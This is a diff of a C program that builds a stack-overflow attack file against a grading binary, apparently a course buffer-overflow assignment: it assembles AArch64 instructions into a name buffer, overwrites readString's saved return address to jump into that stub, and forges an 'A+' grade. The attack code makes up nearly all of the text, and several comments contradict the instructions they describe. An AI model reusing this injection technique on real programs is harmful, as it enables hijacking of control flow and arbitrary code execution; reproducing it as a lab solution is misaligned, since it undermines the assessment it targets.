@@ -5,74 +5,83 @@
  */
 
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include "miniassembler.h"
-
-enum
-{
-    BUFSIZE = 48
-};
+#include <string.h>
 
 int main(void)
 {
-    /* all declarations first (ISO C90) */
     FILE *f;
     unsigned long pc;
     unsigned int instr;
-    const unsigned long NAME_ADDR = 0x420058UL; /* start of name[] */
-    const unsigned int SVC_INST = 0xd4000001;   /* encoding for `svc #0` */
-    const unsigned long PRINTF_ADDR = 0x400690  /* Start of printf */
-        const char *msg = "A+ is your grade\nThank you, BZOC\n";
-    unsigned msglen = (unsigned)strlen(msg);
-    int pad, i;
+    int i;
 
-    /* open the payload file */
-    f = fopen("dataAplus", "w");
-    if (!f)
+    /* These constants come from the grader’s map: */
+    const unsigned long NAME_ADDR = 0x420058UL;  /* start of name[] in BSS */
+    const unsigned long GRADE_ADDR = 0x420044UL; /* &grade global ('D') */
+    const unsigned long PRINT_ADDR = 0x40089cUL;
+    unsigned long returnAddr = 0x420058UL + 28; /* skip-B, print-grade code */
+
+    const unsigned long PRINTF_ADDR = 0x400690; /* Start of printf */
+
+    /* 1) Open the attack file for binary write */
+    f = fopen("dataA", "w");
+    fprintf(f, "%s", "OwenAndBen");
+
+    for (i = 0; i < 2; i++)
     {
-        perror("fopen dataAplus");
-        return 1;
+        fprintf(f, "%c", '\0');
     }
 
-    /* 1) build the 48-byte stub at name[] (it will live at NAME_ADDR at runtime) */
-    pc = NAME_ADDR + 28;
+    /* 2) Emit a 48-byte stub into buf[] (and ultimately name[]): */
+    pc = NAME_ADDR + 12; /* at runtime, the stub’s first instr is at NAME_ADDR */
 
-    /* --- write(1, msg, msglen) syscall --- */
-    instr = MiniAssembler_mov(8, 64); /* w8 = 64 (sys_write) */
+    /* a) ADR  X0, GRADE_ADDR(PC)   ; X0 ← &grade       */
+    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
     fwrite(&instr, 4, 1, f);
     pc += 4;
-    instr = MiniAssembler_mov(0, 1); /* w0 = 1  (stdout)   */
-    fwrite(&instr, 4, 1, f);
-    pc += 4;
-    instr = MiniAssembler_adr(1, NAME_ADDR + BUFSIZE, pc); /* x1 = &msg        */
-    fwrite(&instr, 4, 1, f);
-    pc += 4;
-    instr = MiniAssembler_mov(2, msglen); /* w2 = msglen      */
-    fwrite(&instr, 4, 1, f);
-    pc += 4;
-    fwrite(&SVC_INST, 4, 1, f);
-    pc += 4; /* svc #0           */
 
-    /* --- exit(0) syscall --- */
-    instr = MiniAssembler_mov(8, 93); /* w8 = 93 (sys_exit) */
+    /* b) MOV  W1, #'A'             ; W1 ← ASCII '\0'   */
+    instr = MiniAssembler_mov(1, (int)'\0');
     fwrite(&instr, 4, 1, f);
     pc += 4;
-    instr = MiniAssembler_mov(0, 0); /* w0 = 0 (status)  */
-    fwrite(&instr, 4, 1, f);
-    pc += 4;
-    fwrite(&SVC_INST, 4, 1, f);
-    pc += 4; /* svc #0           */
 
-    /* 2) pad stub out to exactly BUFSIZE bytes */
-    pad = BUFSIZE - (int)(pc - (NAME_ADDR + 28));
-    for (i = 0; i < pad; i++)
+    /* c) STRB W1, [X0]             ; *(&grade) = '\0'  */
+    instr = MiniAssembler_strb(1, 0);
+    fwrite(&instr, 4, 1, f);
+    pc += 4;
+
+    /* b) MOV  W0, #'A'             ; W1 ← ASCII 'A'   */
+    instr = MiniAssembler_mov(0, (int)'A');
+    fwrite(&instr, 4, 1, f);
+    pc += 4;
+
+    instr = MiniAssembler_bl(PRINTF_ADDR, pc);
+    fwrite(&instr, 4, 1, f);
+    pc += 4;
+
+    /* b) MOV  W0, #'+'             ; W1 ← ASCII '+'   */
+    instr = MiniAssembler_mov(0, (int)'+');
+    fwrite(&instr, 4, 1, f);
+    pc += 4;
+
+    instr = MiniAssembler_bl(PRINTF_ADDR, pc);
+    fwrite(&instr, 4, 1, f);
+    pc += 4;
+
+    /* d) B    PRINT_ADDR(PC)       ; jump into grader’s printf */
+    instr = MiniAssembler_b(PRINT_ADDR, pc);
+    fwrite(&instr, 4, 1, f);
+    pc += 4;
+
+    /* e) Pad stub out to 48 bytes with null bytes" */
+    for (i = 0; i < 4; i++)
     {
-        fputc('\0', f);
+        fprintf(f, "%c", '\0');
     }
 
-    /* 3) append the literal message bytes immediately after the 48-byte stub */
-    fwrite(msg, 1, msglen, f);
+    /* 3) Overwrite readString’s saved x30 with NAME_ADDR
+        so that when readString does `ret`, it jumps into our stub. */
+    fwrite(&returnAddr, sizeof(PRINT_ADDR), 1, f);
 
     fclose(f);
     return 0;
